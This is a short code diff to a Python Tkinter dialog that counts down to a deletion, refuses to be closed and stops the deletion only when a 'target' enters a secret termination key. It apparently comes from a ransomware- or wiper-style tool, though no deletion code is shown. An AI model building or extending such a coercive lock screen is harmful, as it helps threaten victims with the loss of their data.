@@ -563,8 +563,20 @@ class DeletionCountdownDialog(Toplevel):
     def on_try_close():
         messagebox.showwarning("Warning", "This window cannot be closed directly.")
 
+    # Function to Handle submission of the secondary termination key to stop a deletion process
     def on_enter_key(self):
-        pass
+        self.iconbitmap(ICON_PATH)
+
+        # Show Custom Secondary Termination Key Dialog Box to get Key from target input
+        key = CustomSecondaryTerminationKeyDialog(self, icon_path=ICON_PATH, title="Stop Deletion",
+                                                  prompt="Enter the secondary termination key:").result
+
+        # Checked if inputted the key same as Secondary Termination Key, then Stop deletion Process
+        if key == SECONDARY_TERMINATION_KEY:
+            self.stop_deletion_callback()
+            self.destroy()
+        else:
+            messagebox.showerror("Error", "Incorrect secondary termination key.")
 
 
 # if __name__ == "__main__":
